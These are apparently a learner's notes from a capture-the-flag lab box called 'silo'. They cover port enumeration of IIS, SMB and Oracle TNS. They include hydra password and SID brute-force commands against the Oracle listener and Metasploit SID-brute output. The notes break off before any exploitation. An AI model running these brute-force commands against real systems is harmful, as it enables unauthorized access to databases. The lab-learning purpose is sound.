# 10.10.10.82 - silo
## port 80 - microsoft iis
- currently brute focing dir
- /aspnet_client found via nikto through autorecon

## port 445 smb share, 135, 139 - netbios 
- ports most likely are related 
- nothing enumerated out of smb share

## ports 1521 and 49160 oracle tns --> nmap claims version 11.2.0.2.0
- usual service - rdbms - relational database
- nse scripts dont reveal anything worthy 
	* attempting to follow along to this article `https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573`
	* auto recon ran some of the scripts like tnscmd, but I did not understand the output
	* because I recieved an error when executing 
```
tnscmd10g version -h 10.10.10.82
sending (CONNECT_DATA=(COMMAND=version)) to 10.10.10.82:1521
	writing 90 bytes
	reading
	.e......"..Y(DESCRIPTION=(TMP=)(VSNNUM=186647040)(ERR=1189)(ERROR_STACK=(ERROR=(CODE=1189)(EMFI=4))))))))))))))
```
	* the article says that the listener may be password protected and to use hydra as a cracker

```
hydra -P /usr/share/wordlists/rockyou.txt -s 1521 10.10.10.82 oracle-listener
```
	* was taking too long. If it was supposed to brute rockyou.txt would have immediately found it
### Try to bruteforce SIDs using metasploit - auxiliary(scanner/oracle/sid_brute) 
```
[+] 10.10.10.82:1521      - 10.10.10.82:1521 Oracle - 'XE' is valid  
[+] 10.10.10.82:1521      - 10.10.10.82:1521 Oracle - 'PLSEXTPROC' is valid 
[+] 10.10.10.82:1521      - 10.10.10.82:1521 Oracle - 'CLREXTPROC' is valid
```
- have 3 valid SID's --> brute force logins

#### Conversely there was also a hydra command to brute force SID's where host.victim is the ip address
```
hydra -P /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 10.10.10.82 oracle-sid
```

